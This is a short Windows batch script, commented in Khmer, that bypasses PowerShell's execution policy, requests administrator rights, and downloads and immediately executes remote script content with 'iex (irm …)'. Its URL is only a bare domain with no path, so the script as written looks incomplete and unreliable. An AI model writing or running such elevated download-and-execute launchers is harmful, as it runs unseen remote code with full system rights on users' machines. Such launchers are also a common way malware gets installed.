@echo off
setlocal

:: បង្ខំឱ្យរត់កូដ PowerShell ដោយទាញយកអនឡាញមកដំណើរការ (ងាយស្រួល និងមិនបែកបន្ទាត់)
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p = 'https://githubusercontent.com'; if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Start-Process powershell.exe -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-Command',\"iex (irm '$p')\"); exit 0 }; iex (irm $p)"
exit /b %ERRORLEVEL%
